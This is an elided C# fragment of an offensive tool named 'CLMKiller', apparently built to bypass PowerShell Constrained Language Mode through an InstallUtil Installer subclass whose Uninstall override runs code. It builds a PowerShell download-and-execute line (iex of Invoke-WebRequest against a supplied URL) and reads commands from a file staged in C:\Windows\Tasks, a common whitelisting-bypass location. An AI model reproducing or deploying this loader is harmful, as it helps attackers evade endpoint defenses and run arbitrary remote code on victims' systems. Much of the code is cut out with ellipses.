...
namespace CLMKiller
{
    ...
    public class Sample : System.Configuration.Install.Installer
    {
        ...
        static void Kill(string url)
        {
            ...
            String exec = $"iex(IWR -UseBasicParsing -URI '{url}' )";  // Mazbe add "-UseBasicParsing" to IWR
        ...
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            ...
            string filePath = @"C:\Windows\Tasks\finances.txt";
            string command;

            try
            {
                // Read the content of the file into the 'command' variable
